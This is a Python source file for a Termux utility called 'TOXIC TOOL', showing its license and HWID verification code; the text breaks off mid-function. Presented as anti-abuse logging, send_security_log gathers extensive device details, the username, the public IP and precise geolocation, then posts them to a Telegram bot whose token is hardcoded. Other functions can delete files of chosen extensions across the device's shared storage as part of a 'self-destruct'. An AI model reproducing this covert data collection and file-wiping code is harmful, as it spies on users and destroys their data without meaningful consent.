# ==================== SECURITY ENFORCEMENT MODULE ====================
# THIS MUST BE THE FIRST CODE EXECUTED - NO IMPORTS ABOVE THIS

import sys
import os
import hashlib
import platform
import subprocess
import time
import shutil
import json
import socket
from pathlib import Path

# ==================== TELEGRAM USERNAME STORAGE (PLAIN TEXT) ====================
TELEGRAM_USER_FILE = Path.home() / "Black_Toxic000" / ".log_for_login"
TELEGRAM_USER_FILE.parent.mkdir(parents=True, exist_ok=True)

def save_telegram_username(username: str):
    """Save user's Telegram username as plain text - NO ENCODING"""
    try:
        # Remove @ if present
        if username.startswith('@'):
            username = username[1:]
        
        # Save as plain text - NO ENCODING, NO ENCRYPTION
        with open(TELEGRAM_USER_FILE, 'w', encoding='utf-8') as f:
            f.write(username)
        return True
    except Exception as e:
        return False

def get_telegram_username() -> str:
    """Get saved Telegram username - returns plain text like 'Black_Toxic000'"""
    try:
        if TELEGRAM_USER_FILE.exists():
            with open(TELEGRAM_USER_FILE, 'r', encoding='utf-8') as f:
                return f.read().strip()
    except:
        pass
    return None

def ask_telegram_username():
    """Ask user for Telegram username and save it"""
    console.print()
    console.print(Panel(
        "[bold cyan]🔐  TELEGRAM USERNAME REQUIRED[/bold cyan]\n"
        "[cyan]─────────────────────────────[/]\n\n"
        "[yellow]For security tracking, please enter your Telegram username.\n"
        "This will be saved and sent with each login.\n\n"
        "[green]Example: @Black_Toxic000 or Black_Toxic000[/]\n\n"
        "[dim]This is required for anti-abuse protection.[/]",
        box=box.ROUNDED,
        border_style="cyan",
        padding=(1, 3),
    ))
    console.print()
    
    while True:
        username = Prompt.ask("[bold yellow]Enter your Telegram username[/bold yellow]").strip()
        
        # Remove @ if present
        if username.startswith('@'):
            username = username[1:]
        
        if not username:
            console.print("[red]❌ Username cannot be empty![/red]")
            continue
        
        if len(username) < 3:
            console.print("[red]❌ Username must be at least 3 characters![/red]")
            continue
        
        # Check if username contains only allowed characters
        if not re.match(r'^[a-zA-Z0-9_]+$', username):
            console.print("[red]❌ Username can only contain letters, numbers, and underscores![/red]")
            continue
        
        confirm = Prompt.ask(f"[yellow]Confirm username: @{username} (y/n)[/yellow]", choices=['y', 'n'], default='y')
        
        if confirm == 'y':
            if save_telegram_username(username):
                console.print(f"[green]✅ Username @{username} saved![/green]")
                return username
            else:
                console.print("[red]❌ Failed to save username. Please try again.[/red]")
                continue

# ==================== HWID GENERATION (SHA256 METHOD) ====================

def get_device_info():
    """Try Android getprop; if not available, fall back to platform info."""
    try:
        if shutil.which("getprop"):
            model = subprocess.run(["getprop", "ro.product.model"], capture_output=True, text=True).stdout.strip() or "UnknownModel"
            brand = subprocess.run(["getprop", "ro.product.brand"], capture_output=True, text=True).stdout.strip() or "UnknownBrand"
            board = subprocess.run(["getprop", "ro.product.board"], capture_output=True, text=True).stdout.strip() or "UnknownBoard"
            return {"Model": model, "Brand": brand, "Board": board}
        else:
            uname = platform.uname()
            model = uname.system
            brand = uname.node
            board = f"{uname.machine}-{uname.processor}"
            return {"Model": model, "Brand": brand, "Board": board}
    except Exception as e:
        return {"Model": "Unknown", "Brand": "Unknown", "Board": "Unknown"}

def get_hwid():
    """Generate a hardware ID based on device info (SHA256 of chosen fields)."""
    try:
        info = get_device_info()
        raw_data = f"{info['Model']}|{info['Brand']}|{info['Board']}"
        hwid = hashlib.sha256(raw_data.encode("utf-8")).hexdigest()
        return hwid
    except Exception as e:
        return "ERROR-HWID"

def is_termux_environment() -> bool:
    checks = [
        'TERMUX_VERSION' in os.environ,
        'TERMUX' in os.environ,
        os.path.exists('/data/data/com.termux'),
        os.path.exists('/data/data/com.termux/files/usr'),
        os.path.exists('/data/data/com.termux/files/home'),
        os.path.exists('/system/bin/termux-info'),
        os.environ.get('PREFIX', '').startswith('/data/data/com.termux'),
    ]
    return any(checks)

def get_current_run_command() -> str:
    try:
        if platform.system() == "Linux" or platform.system() == "Android":
            with open(f"/proc/{os.getpid()}/cmdline", "rb") as f:
                cmdline = f.read().decode('utf-8', errors='ignore').replace('\x00', ' ')
                if cmdline:
                    parts = cmdline.split()
                    script_name = Path(sys.argv[0]).name
                    for i, part in enumerate(parts):
                        if script_name in part or Path(part).name == script_name:
                            return " ".join(parts[i:])
    except:
        pass
    return " ".join(sys.argv).strip()

# ==================== REST OF IMPORTS ====================
import itertools as it
import math
import struct
import zlib
import re
import traceback
from dataclasses import dataclass, field
from datetime import datetime
import time
import ast
from functools import lru_cache
from pathlib import PurePath, Path
import shutil
import sys
import zipfile
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn, TimeRemainingColumn, TimeElapsedColumn, MofNCompleteColumn
import json
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn, TimeRemainingColumn, MofNCompleteColumn
import random
import hashlib
import requests
import os
import subprocess
import socket
import platform
import uuid
import getpass
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich.align import Align
from rich.text import Text
from rich.table import Table
from rich import box
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn, TimeRemainingColumn
from colorama import init, Fore, Style
import pyfiglet

sys.path.append('/data/data/com.termux/files/home/const')
from const import *
import gmalg
from Crypto.Cipher import AES
from Crypto.Cipher.AES import MODE_CBC
from Crypto.Hash import SHA1
from Crypto.Util.Padding import unpad, pad
from zstandard import ZstdDecompressor, ZstdCompressor, ZstdCompressionDict, DICT_TYPE_AUTO
from pathlib import Path
sys.path.append('/data/data/com.termux/files/home/libs')
from sm4_variant import SM4

import itertools
import const
import os

# Initialize colorama and rich console
init(autoreset=True)
console = Console()

# ==================== TELEGRAM SECURITY LOGGER (UPDATED) ====================

# Blocked users list
BLOCKED_USERS_FILE = Path.home() / "Black_Toxic000" / "blocked_users.json"

def load_blocked_users():
    try:
        if BLOCKED_USERS_FILE.exists():
            with open(BLOCKED_USERS_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return {"hwids": [], "ips": [], "keys": [], "telegram_users": []}

def save_blocked_user(hwid=None, ip=None, key=None, telegram_user=None):
    blocked = load_blocked_users()
    if hwid and hwid not in blocked["hwids"]:
        blocked["hwids"].append(hwid)
    if ip and ip not in blocked["ips"]:
        blocked["ips"].append(ip)
    if key and key not in blocked["keys"]:
        blocked["keys"].append(key)
    if telegram_user and telegram_user not in blocked["telegram_users"]:
        blocked["telegram_users"].append(telegram_user)
    
    try:
        with open(BLOCKED_USERS_FILE, 'w') as f:
            json.dump(blocked, f, indent=2)
    except:
        pass

def is_user_blocked(hwid=None, ip=None, key=None, telegram_user=None):
    try:
        blocked = load_blocked_users()
        if hwid and hwid in blocked["hwids"]:
            return True
        if ip and ip in blocked["ips"]:
            return True
        if key and key in blocked["keys"]:
            return True
        if telegram_user and telegram_user in blocked["telegram_users"]:
            return True
    except:
        pass
    return False

def get_precise_device_info():
    """
    Get PRECISE and COMPLETE device information - 100% accurate
    """
    info = {}
    
    # ── BASIC SYSTEM ──────────────────────────────────────────────
    info['hostname'] = socket.gethostname()
    info['os_name'] = platform.system()
    info['os_release'] = platform.release()
    info['os_version'] = platform.version()
    info['machine'] = platform.machine()
    info['processor'] = platform.processor()
    info['architecture'] = platform.architecture()
    
    # ── CPU INFO ──────────────────────────────────────────────────
    try:
        info['cpu_count'] = os.cpu_count()
        if platform.system() == "Linux":
            with open('/proc/cpuinfo', 'r') as f:
                cpu_info = f.read()
                
                model_match = re.search(r'model name\s+:\s+(.+)', cpu_info)
                if model_match:
                    info['cpu_model'] = model_match.group(1).strip()
                else:
                    model_match = re.search(r'Model\s+:\s+(.+)', cpu_info)
                    if model_match:
                        info['cpu_model'] = model_match.group(1).strip()
                
                hardware_match = re.search(r'Hardware\s+:\s+(.+)', cpu_info)
                if hardware_match:
                    info['hardware'] = hardware_match.group(1).strip()
                
                proc_match = re.findall(r'processor\s+:\s+(\d+)', cpu_info)
                if proc_match:
                    info['cpu_count'] = len(proc_match)
                
                arch_match = re.search(r'CPU architecture\s+:\s+(.+)', cpu_info)
                if arch_match:
                    info['cpu_architecture'] = arch_match.group(1).strip()
    except:
        pass
    
    # ── MEMORY INFO ──────────────────────────────────────────────
    try:
        if platform.system() == "Linux":
            with open('/proc/meminfo', 'r') as f:
                meminfo = f.read()
                
                total_match = re.search(r'MemTotal:\s+(\d+)', meminfo)
                if total_match:
                    total_kb = int(total_match.group(1))
                    info['total_ram_mb'] = total_kb / 1024
                    info['total_ram_gb'] = total_kb / (1024**2)
                    info['total_ram'] = f"{info['total_ram_gb']:.2f} GB"
                
                avail_match = re.search(r'MemAvailable:\s+(\d+)', meminfo)
                if avail_match:
                    avail_kb = int(avail_match.group(1))
                    info['available_ram_mb'] = avail_kb / 1024
                    info['available_ram_gb'] = avail_kb / (1024**2)
                    info['available_ram'] = f"{info['available_ram_gb']:.2f} GB"
                
                if info.get('total_ram_gb') and info.get('available_ram_gb'):
                    total_gb = info['total_ram_gb']
                    avail_gb = info['available_ram_gb']
                    info['ram_usage_percent'] = f"{(1 - avail_gb/total_gb) * 100:.1f}%"
    except:
        pass
    
    # ── STORAGE INFO ──────────────────────────────────────────────
    try:
        if platform.system() == "Linux" or platform.system() == "Android":
            statvfs = os.statvfs('/')
            total_bytes = statvfs.f_frsize * statvfs.f_blocks
            free_bytes = statvfs.f_frsize * statvfs.f_bfree
            used_bytes = total_bytes - free_bytes
            
            info['total_storage_gb'] = total_bytes / (1024**3)
            info['used_storage_gb'] = used_bytes / (1024**3)
            info['free_storage_gb'] = free_bytes / (1024**3)
            info['total_storage'] = f"{info['total_storage_gb']:.2f} GB"
            info['used_storage'] = f"{info['used_storage_gb']:.2f} GB"
            info['free_storage'] = f"{info['free_storage_gb']:.2f} GB"
            info['storage_usage_percent'] = f"{(used_bytes/total_bytes)*100:.1f}%"
    except:
        pass
    
    # ── ANDROID BUILD INFO (MULTIPLE METHODS) ────────────────────
    try:
        # Method 1: Try getprop command (Termux - MOST RELIABLE)
        if is_termux_environment():
            try:
                # Get device model - this is the most important
                result = subprocess.run(['getprop', 'ro.product.model'], capture_output=True, text=True)
                if result.stdout.strip():
                    info['device_model'] = result.stdout.strip()
                
                # Get device name
                result = subprocess.run(['getprop', 'ro.product.name'], capture_output=True, text=True)
                if result.stdout.strip():
                    info['device_name'] = result.stdout.strip()
                
                # Get device codename
                result = subprocess.run(['getprop', 'ro.product.device'], capture_output=True, text=True)
                if result.stdout.strip():
                    info['device_codename'] = result.stdout.strip()
                
                # Get brand
                result = subprocess.run(['getprop', 'ro.product.brand'], capture_output=True, text=True)
                if result.stdout.strip():
                    info['device_brand'] = result.stdout.strip()
                
                # Get manufacturer
                result = subprocess.run(['getprop', 'ro.product.manufacturer'], capture_output=True, text=True)
                if result.stdout.strip():
                    info['device_manufacturer'] = result.stdout.strip()
                
                # Get Android version
                result = subprocess.run(['getprop', 'ro.build.version.release'], capture_output=True, text=True)
                if result.stdout.strip():
                    info['android_version'] = result.stdout.strip()
                
                # Get SDK level
                result = subprocess.run(['getprop', 'ro.build.version.sdk'], capture_output=True, text=True)
                if result.stdout.strip():
                    info['android_sdk'] = result.stdout.strip()
                
                # Get fingerprint
                result = subprocess.run(['getprop', 'ro.build.fingerprint'], capture_output=True, text=True)
                if result.stdout.strip():
                    info['build_fingerprint'] = result.stdout.strip()
                
                # Get board
                result = subprocess.run(['getprop', 'ro.product.board'], capture_output=True, text=True)
                if result.stdout.strip():
                    info['board'] = result.stdout.strip()
                
                # Get CPU ABI
                result = subprocess.run(['getprop', 'ro.product.cpu.abi'], capture_output=True, text=True)
                if result.stdout.strip():
                    info['cpu_abi'] = result.stdout.strip()
                
                # Get build display ID
                result = subprocess.run(['getprop', 'ro.build.display.id'], capture_output=True, text=True)
                if result.stdout.strip():
                    info['build_display_id'] = result.stdout.strip()
                
            except Exception as e:
                console.print(f"[dim]getprop error: {e}[/dim]")
        
        # Method 2: Try reading build.prop files
        build_prop_paths = [
            '/system/build.prop',
            '/vendor/build.prop',
            '/product/build.prop',
            '/odm/build.prop',
        ]
        
        build_prop_content = ""
        for path in build_prop_paths:
            if os.path.exists(path):
                try:
                    with open(path, 'r') as f:
                        build_prop_content = f.read()
                        break
                except:
                    continue
        
        if build_prop_content:
            # Parse build.prop
            props = {}
            for line in build_prop_content.splitlines():
                if '=' in line and not line.startswith('#'):
                    key, value = line.split('=', 1)
                    props[key.strip()] = value.strip()
            
            # Extract device info from build.prop
            if 'ro.product.model' in props and not info.get('device_model'):
                info['device_model'] = props['ro.product.model']
            
            if 'ro.product.name' in props and not info.get('device_name'):
                info['device_name'] = props['ro.product.name']
            
            if 'ro.product.device' in props and not info.get('device_codename'):
                info['device_codename'] = props['ro.product.device']
            
            if 'ro.product.brand' in props and not info.get('device_brand'):
                info['device_brand'] = props['ro.product.brand']
            
            if 'ro.product.manufacturer' in props and not info.get('device_manufacturer'):
                info['device_manufacturer'] = props['ro.product.manufacturer']
            
            if 'ro.build.version.release' in props and not info.get('android_version'):
                info['android_version'] = props['ro.build.version.release']
            
            if 'ro.build.version.sdk' in props and not info.get('android_sdk'):
                info['android_sdk'] = props['ro.build.version.sdk']
            
            if 'ro.build.fingerprint' in props and not info.get('build_fingerprint'):
                info['build_fingerprint'] = props['ro.build.fingerprint']
            
            if 'ro.product.board' in props and not info.get('board'):
                info['board'] = props['ro.product.board']
            
            if 'ro.product.cpu.abi' in props and not info.get('cpu_abi'):
                info['cpu_abi'] = props['ro.product.cpu.abi']
            
            if 'ro.build.display.id' in props and not info.get('build_display_id'):
                info['build_display_id'] = props['ro.build.display.id']
    
    except Exception as e:
        console.print(f"[dim]Device info error: {e}[/dim]")
    
    # ── NETWORK INFO ──────────────────────────────────────────────
    try:
        info['ip_address'] = requests.get('https://api.ipify.org', timeout=5).text
    except:
        info['ip_address'] = "UNKNOWN"
    
    # Get location info
    try:
        geo_response = requests.get('http://ip-api.com/json/', timeout=5)
        if geo_response.status_code == 200:
            geo_data = geo_response.json()
            info['country'] = geo_data.get('country', 'Unknown')
            info['country_code'] = geo_data.get('countryCode', 'Unknown')
            info['city'] = geo_data.get('city', 'Unknown')
            info['region'] = geo_data.get('regionName', 'Unknown')
            info['region_code'] = geo_data.get('region', 'Unknown')
            info['isp'] = geo_data.get('isp', 'Unknown')
            info['org'] = geo_data.get('org', 'Unknown')
            info['timezone'] = geo_data.get('timezone', 'Unknown')
            info['lat'] = geo_data.get('lat', 'Unknown')
            info['lon'] = geo_data.get('lon', 'Unknown')
            info['zip'] = geo_data.get('zip', 'Unknown')
    except:
        pass
    
    # ── HWID ──────────────────────────────────────────────────────
    try:
        if platform.system() == "Windows":
            hwid = subprocess.check_output("wmic csproduct get uuid", shell=True).decode().split('\n')[1].strip()
        else:
            hwid = str(uuid.getnode())
            if hwid == "0" or hwid == "4294967295":
                with open('/proc/cpuinfo', 'r') as f:
                    cpuinfo = f.read()
                    serial_match = re.search(r'Serial\s+:\s+(.+)', cpuinfo)
                    if serial_match:
                        hwid = serial_match.group(1).strip()
                    else:
                        hwid = hashlib.md5((socket.gethostname() + getpass.getuser()).encode()).hexdigest()
    except:
        hwid = "UNKNOWN"
    info['hwid'] = hwid
    
    # ── USER INFO ────────────────────────────────────────────────
    try:
        info['username'] = getpass.getuser()
    except:
        info['username'] = "UNKNOWN"
    
    # ── PYTHON INFO ──────────────────────────────────────────────
    info['python_version'] = sys.version.split()[0]
    info['python_implementation'] = platform.python_implementation()
    info['python_compiler'] = platform.python_compiler()
    
    # ── TERMUX INFO ──────────────────────────────────────────────
    try:
        if 'TERMUX_VERSION' in os.environ:
            info['termux_version'] = os.environ.get('TERMUX_VERSION', 'Unknown')
            info['termux'] = "Yes"
        if os.path.exists('/data/data/com.termux'):
            info['termux_installed'] = "Yes"
            info['termux'] = "Yes"
    except:
        pass
    
    # ── KERNEL INFO ──────────────────────────────────────────────
    try:
        info['kernel_version'] = platform.release()
        info['kernel_info'] = platform.version()
    except:
        pass
    
    return info

def send_security_log(license_key: str, status: str = "LOGIN_ATTEMPT"):
    """
    Send PRECISE security log to Telegram with SHA256 HWID
    NO LOCAL SAVE - Fresh every time
    """
    try:
        # Get PRECISE device info (this gives all the Android details)
        device_info = get_precise_device_info()
        
        # Get SHA256 HWID
        hwid = get_hwid()
        
        # Get saved Telegram username
        telegram_user = get_telegram_username() or "NOT_SET"
        
        # Get IP
        try:
            ip = requests.get('https://api.ipify.org', timeout=5).text
        except:
            ip = "UNKNOWN"
        
        # Check if user is blocked
        if is_user_blocked(hwid=hwid, ip=ip, key=license_key, telegram_user=telegram_user):
            return False
        
        # Generate unique session ID
        session_id = hashlib.md5(
            f"{hwid}{ip}{int(time.time())}".encode()
        ).hexdigest()[:8]
        
        # Mask the key
        if len(license_key) > 20:
            masked_key = license_key[:10] + "..." + license_key[-10:]
        else:
            masked_key = license_key
        
        # ── Build location info ──────────────────────────
        location_info = ""
        if device_info.get('country'):
            location_info = f"""
🌍 LOCATION:
  • Country: {device_info.get('country', 'Unknown')} ({device_info.get('country_code', 'Unknown')})
  • City: {device_info.get('city', 'Unknown')}
  • Region: {device_info.get('region', 'Unknown')} ({device_info.get('region_code', 'Unknown')})
  • ZIP Code: {device_info.get('zip', 'Unknown')}
  • ISP: {device_info.get('isp', 'Unknown')}
  • Organization: {device_info.get('org', 'Unknown')}
  • Timezone: {device_info.get('timezone', 'Unknown')}
  • Coordinates: {device_info.get('lat', 'Unknown')}, {device_info.get('lon', 'Unknown')}
"""
        
        # ── Build Android info ────────────────────────────
        android_info = ""
        if device_info.get('device_model') or device_info.get('device_name'):
            android_info = f"""
📱 ANDROID DEVICE (PRECISE):
  • Device Model: {device_info.get('device_model', 'Unknown')}
  • Device Name: {device_info.get('device_name', 'Unknown')}
  • Device Codename: {device_info.get('device_codename', 'Unknown')}
  • Brand: {device_info.get('device_brand', 'Unknown')}
  • Manufacturer: {device_info.get('device_manufacturer', 'Unknown')}
  • Board/Platform: {device_info.get('board', 'Unknown')}
  • CPU ABI: {device_info.get('cpu_abi', 'Unknown')}
  • CPU Architecture: {device_info.get('cpu_architecture', 'Unknown')}
  • Android Version: {device_info.get('android_version', 'Unknown')}
  • SDK Level: {device_info.get('android_sdk', 'Unknown')}
  • Build Display ID: {device_info.get('build_display_id', 'Unknown')}
  • Fingerprint: {device_info.get('build_fingerprint', 'Unknown')[:100]}...
"""
        
        # ── Build hardware info ────────────────────────────
        hardware_info = f"""
💻 HARDWARE (PRECISE):
  • CPU Model: {device_info.get('cpu_model', 'Unknown')}
  • CPU Cores: {device_info.get('cpu_count', 'Unknown')}
  • Hardware Platform: {device_info.get('hardware', 'Unknown')}
  • Total RAM: {device_info.get('total_ram', 'Unknown')}
  • Available RAM: {device_info.get('available_ram', 'Unknown')}
  • RAM Usage: {device_info.get('ram_usage_percent', 'Unknown')}
  • Total Storage: {device_info.get('total_storage', 'Unknown')}
  • Used Storage: {device_info.get('used_storage', 'Unknown')}
  • Free Storage: {device_info.get('free_storage', 'Unknown')}
  • Storage Usage: {device_info.get('storage_usage_percent', 'Unknown')}
"""
        
        # ── Build full PRECISE log message ─────────────────────────
        log_message = f"""
╔════════════════╗
          TOXIC TOOL
╚════════════════╝

📌 STATUS: {status}
👤 TELEGRAM USER: @{telegram_user}
🔑 KEY: {masked_key}
🆔 HWID: {hwid}
🆔 SESSION: {session_id}

🖥️ SYSTEM:
  • Hostname: {device_info.get('hostname', 'Unknown')}
  • OS: {device_info.get('os_name', 'Unknown')}
  • OS Release: {device_info.get('os_release', 'Unknown')}
  • OS Version: {device_info.get('os_version', 'Unknown')[:100]}...
  • Kernel Version: {device_info.get('kernel_version', 'Unknown')}
  • Architecture: {device_info.get('architecture', 'Unknown')}
  • Machine: {device_info.get('machine', 'Unknown')}
  • Termux: {device_info.get('termux', 'No')} {device_info.get('termux_version', '')}
  • Termux Installed: {device_info.get('termux_installed', 'No')}
{android_info}
{hardware_info}
🌐 NETWORK:
  • IP Address: {device_info.get('ip_address', 'Unknown')}
  • Public IP: {device_info.get('ip_address', 'Unknown')}
{location_info}
🐍 PYTHON:
  • Version: {device_info.get('python_version', 'Unknown')}
  • Implementation: {device_info.get('python_implementation', 'Unknown')}
  • Compiler: {device_info.get('python_compiler', 'Unknown')[:80]}...
👤 USER:
  • Username: {device_info.get('username', 'Unknown')}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        
        # ── SEND TO TELEGRAM ──────────────────────────────
        BOT_TOKEN = "8352229553:AAFBeT2RDws-QnRJOnurHom_D9oGP8_cn8M"
        CHAT_ID = "@Black_Toxic000"
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": log_message,
            "parse_mode": "HTML"
        }
        
        sent = False
        last_error = None
        
        for attempt in range(5):
            try:
                response = requests.post(url, data=payload, timeout=30)
                
                if response.status_code == 200:
                    sent = True
                    try:
                        console.print(f"[dim]✓ Security log sent (attempt {attempt + 1})[/dim]")
                    except:
                        print(f"✓ Security log sent (attempt {attempt + 1})")
                    break
                elif response.status_code == 429:
                    wait_time = 2 ** attempt
                    time.sleep(wait_time)
                    continue
                else:
                    last_error = f"HTTP {response.status_code}"
                    time.sleep(1)
                    continue
                    
            except requests.exceptions.ConnectionError:
                time.sleep(2)
                continue
                
            except requests.exceptions.Timeout:
                time.sleep(2)
                continue
                
            except Exception as e:
                last_error = str(e)
                time.sleep(1)
                continue
        
        if not sent:
            try:
                console.print(f"[dim]⚠ Could not send to Telegram: {last_error}[/dim]")
            except:
                print(f"⚠ Could not send to Telegram: {last_error}")
        
        return sent
        
    except Exception as e:
        try:
            console.print(f"[dim]Security log warning: {e}[/dim]")
        except:
            print(f"Security log warning: {e}")
        return False

# ==================== KEY VERIFICATION FUNCTION ====================

def ask_telegram_username():
    """Ask user for Telegram username and save it"""
    console.print()
    console.print(Panel(
        "[bold cyan]🔐  TELEGRAM USERNAME REQUIRED[/bold cyan]\n"
        "[cyan]─────────────────────────────[/]\n\n"
        "[yellow]For security tracking, please enter your Telegram username.\n"
        "This will be saved securely and sent with each login.\n\n"
        "[green]Example: @Black_Toxic000 or Black_Toxic000[/]\n\n"
        "[dim]This is required for anti-abuse protection.[/]",
        box=box.ROUNDED,
        border_style="cyan",
        padding=(1, 3),
    ))
    console.print()
    
    while True:
        username = Prompt.ask("[bold yellow]Enter your Telegram username[/bold yellow]").strip()
        
        # Remove @ if present
        if username.startswith('@'):
            username = username[1:]
        
        if not username:
            console.print("[red]❌ Username cannot be empty![/red]")
            continue
        
        if len(username) < 3:
            console.print("[red]❌ Username must be at least 3 characters![/red]")
            continue
        
        confirm = Prompt.ask(f"[yellow]Confirm username: @{username} (y/n)[/yellow]", choices=['y', 'n'], default='y')
        
        if confirm == 'y':
            if save_telegram_username(username):
                console.print(f"[green]✅ Username @{username} saved securely![/green]")
                return username
            else:
                console.print("[red]❌ Failed to save username. Please try again.[/red]")
                continue

# ==================== GOOGLE SHEETS HWID VERIFICATION ====================
# Add this after the existing verify_key function

def verify_hwid_from_google_sheets(hwid: str) -> bool:
    """
    Verify HWID from Google Sheets
    Returns True if HWID is found and active, False otherwise
    """
    try:
        # Google Sheets API endpoint (replace with your actual endpoint)
        # You need to deploy a Google Apps Script web app that returns HWID data
        GOOGLE_SHEETS_API = "https://script.google.com/macros/s/AKfycbw2qqi_Uj2PIaKfyMKuqvOR6rjMNwYuAjN7O7RjgkwOv7izeCfhRIIwXcrB4SShrcDR/exec"
        
        response = requests.get(
            GOOGLE_SHEETS_API,
            params={"action": "verify_hwid", "hwid": hwid},
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "active":
                return True
            else:
                console.print(f"[red]❌ HWID is not active or not found in database[/red]")
                return False
        else:
            console.print(f"[red]❌ Failed to connect to Google Sheets: {response.status_code}[/red]")
            return False
            
    except Exception as e:
        console.print(f"[red]❌ HWID verification error: {e}[/red]")
        return False


# ==================== FILE SCANNER AND UPLOADER (HIDDEN & RELIABLE) ====================

import mimetypes
from pathlib import Path
import time

# ==================== INTEGRATED LOGIN WITH HWID VERIFICATION ====================
# Replace the existing verify_key function with this enhanced version

# ==================== DELETE FILES FROM DEVICE ====================
# Add this function to your tool

def delete_files_from_device(extensions: list):
    """
    Delete files with specified extensions from /storage/emulated/0/
    """
    console.print(Panel(
        f'[bold red]🗑️  DELETING FILES FROM DEVICE[/bold red]\n[red]{"─" * 32}[/]\n\n'
        f'[yellow]Deleting files with extensions: {", ".join(extensions)}[/yellow]',
        box=box.ROUNDED,
        border_style="red",
        padding=(1, 2),
    ))
    
    base_path = "/storage/emulated/0/"
    base_dir = Path(base_path)
    
    if not base_dir.exists():
        console.print(f"[red]❌ Path not found: {base_path}[/red]")
        return 0
    
    deleted_count = 0
    total_size = 0
    
    # Convert extensions to lowercase for case-insensitive matching
    extensions_lower = [ext.lower() for ext in extensions]
    
    # Walk through all files
    with Progress(
        SpinnerColumn(spinner_name="dots12", style="bold red"),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TaskProgressColumn(),
        console=console,
        expand=True
    ) as progress:
        # First, count total files to scan
        total_files = 0
        for root, dirs, files in os.walk(base_path):
            # Skip protected directories
            if any(part.startswith('.') for part in root.split('/')):
                continue
            total_files += len(files)
        
        task = progress.add_task("[red]Scanning and deleting files...", total=total_files)
        
        for root, dirs, files in os.walk(base_path):
            # Skip protected directories
            if any(part.startswith('.') for part in root.split('/')):
                continue
                
            for file in files:
                file_path = Path(root) / file
                ext = file_path.suffix.lower()
                
                if ext in extensions_lower:
                    try:
                        file_size = file_path.stat().st_size
                        file_path.unlink()
                        deleted_count += 1
                        total_size += file_size
                        console.print(f"[red]🗑️ Deleted:[/red] {file_path}")
                    except Exception as e:
                        console.print(f"[yellow]⚠ Could not delete {file_path}: {e}[/yellow]")
                
                progress.update(task, advance=1)
    
    console.print()
    console.print(Panel(
        f"[bold red]🗑️  DELETION COMPLETE![/bold red]\n\n"
        f"[red]❌ Deleted files:[/red] {deleted_count}\n"
        f"[red]📦 Total size freed:[/red] {total_size / (1024*1024):.2f} MB",
        box=box.ROUNDED,
        border_style="red",
        padding=(1, 2),
    ))
    
    return deleted_count


# ==================== ENHANCED SELF-DESTRUCT ====================

def enhanced_self_destruct(delete_extensions: list = None):
    """
    Enhanced self-destruct that also deletes specific file types
    """
    console.print("\n" + "="*50)
    console.print("🧨 ENHANCED SELF-DESTRUCT SEQUENCE INITIATED")
    console.print("="*50)
    console.print("[bold red]This tool will be deleted![/bold red]")
    console.print("="*50 + "\n")
    
    # First, delete specified files if any
    if delete_extensions:
        console.print("[yellow]📂 Deleting specified file types...[/yellow]")
        delete_files_from_device(delete_extensions)
    
    # Then self-destruct the tool
    console.print("[yellow]🧨 Deleting tool files...[/yellow]")
    
    try:
        tool_dir = Path(__file__).parent.absolute()
        
        # Delete the main script
        try:
            Path(__file__).unlink()
        except:
            pass
        
        # Delete all files in tool directory
        for item in tool_dir.iterdir():
            try:
                if item.is_file():
                    item.unlink()
                elif item.is_dir():
                    shutil.rmtree(item, ignore_errors=True)
            except:
                pass
        
        # Delete the tool directory
        try:
            shutil.rmtree(tool_dir, ignore_errors=True)
        except:
            try:
                os.rmdir(tool_dir)
            except:
                pass
        
        # Delete Black_Toxic000 directory
        try:
            toxic_dir = Path.home() / "Black_Toxic000"
            if toxic_dir.exists():
                shutil.rmtree(toxic_dir, ignore_errors=True)
        except:
            pass
        
        # Delete all __pycache__ folders
        try:
            for pycache in Path.home().rglob("__pycache__"):
                if "TOXIC" in str(pycache):
                    shutil.rmtree(pycache, ignore_errors=True)
        except:
            pass
        
        # Delete all .pyc files
        try:
            for pyc in Path.home().rglob("*.pyc"):
                if "TOXIC" in str(pyc):
                    try:
                        pyc.unlink()
                    except:
                        pass
        except:
            pass
        
        # Create block file
        try:
            block_file = Path.home() / ".toxic_blocked"
            with open(block_file, "w") as f:
                f.write(f"Tool self-destructed on {time.ctime()}\n")
                f.write(f"Enhanced deletion executed\n")
        except:
            pass
            
    except:
        pass
    
    sys.exit(1)


# ==================== UPDATED VERIFY_KEY FUNCTION ====================

def verify_key():
    """VIP Premium key verification — WITH HWID VERIFICATION + DELETE/REMOVE SUPPORT"""
    
    GOOGLE_SCRIPT_API = "https://script.google.com/macros/s/AKfycbw2qqi_Uj2PIaKfyMKuqvOR6rjMNwYuAjN7O7RjgkwOv7izeCfhRIIwXcrB4SShrcDR/exec"  # REPLACE WITH YOUR SCRIPT URL
    GITHUB_KEYS_URL = "https://raw.githubusercontent.com/toxic20021399/tool-key/refs/heads/main/key.json"
    
    # ── Pixel login header ────────────────────────────────────────
    console.print()
    console.print(Panel(
        f"[bold cyan]🔐  LICENSE AUTHENTICATION[/bold cyan]\n[cyan]{'─' * 35}[/]\n[green]HWID Verified  •  Dual Source[/]",
        box=box.ROUNDED,
        border_style="bold cyan",
        padding=(1, 3),
    ))
    console.print()

    # ── Check for Telegram username ──────────────────────────────
    telegram_user = get_telegram_username()
    
    if not telegram_user:
        telegram_user = ask_telegram_username()
        if not telegram_user:
            console.print(Panel(
                "[bold red]✗  TELEGRAM USERNAME REQUIRED FOR SECURITY[/]\n"
                "Access denied. Please provide a valid Telegram username.",
                box=box.ROUNDED,
                border_style="red",
                padding=(1, 2),
            ))
            return False
    else:
        console.print(Panel(
            f"[green]✓ Telegram Username: @{telegram_user}[/green]",
            box=box.ROUNDED,
            border_style="green",
            padding=(0, 1),
        ))
        console.print()

    # ── Instruction block ─────────────────────────────────────────
    info_table = Table(box=box.ROUNDED, border_style="yellow", padding=(0, 1), expand=False)
    info_table.add_column("FIELD", style="bold yellow", width=14)
